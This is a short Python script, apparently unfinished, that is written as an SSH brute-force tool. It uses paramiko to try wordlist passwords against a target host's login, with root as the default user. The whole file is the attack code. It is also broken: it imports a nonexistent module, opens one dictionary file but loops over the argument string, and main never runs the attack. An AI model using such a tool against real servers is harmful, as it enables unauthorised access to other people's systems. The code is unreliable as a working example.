#!/usr/bin/python
#mix python 2 and 3, stopped script.

import paramiko    #Python module to work with the SSH protocol
import socket
import argparse
from optparser import OptionParser

def bruteForce(target, user, port, dictionary):
    try:
        passwords = open("dictionary.txt", "r")
    except IOError:
        print("The dictionary was not found")
        return 0

    for password in dictionary:
        password = password[:-1]    #delete \n
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    #save to known hosts
        try:
            client.connect(target, port, user, password)
            print("[+] Password found: %s"%(password))
            break
        except paramiko.AuthenticationException:
            print("[-] Wrong password: %s "%(password))
            client.close()
        except socket.error:
            print("[-] You have been banned :-(")
            break
    client.close()

def main():
    parser = argparse.ArgumentParser(description="Brute force attack against SSH")
    parser.add_argument("-t", "--target", dest="target", help="Target IP or URL", required=True)
    parser.add_argument("-p", "--port", dest="port", help="SSH Service port", required=True)
    parser.add_argument("-u", "--user", dest="user", help="User of SSH protocol (default root)", default="root")
    parser.add_argument("-d", "--dictionary", dest="dictionary", help="list of passwords", required=True)
    arguments = parser.parse_args()

if __name__ == "__main__":

    main()
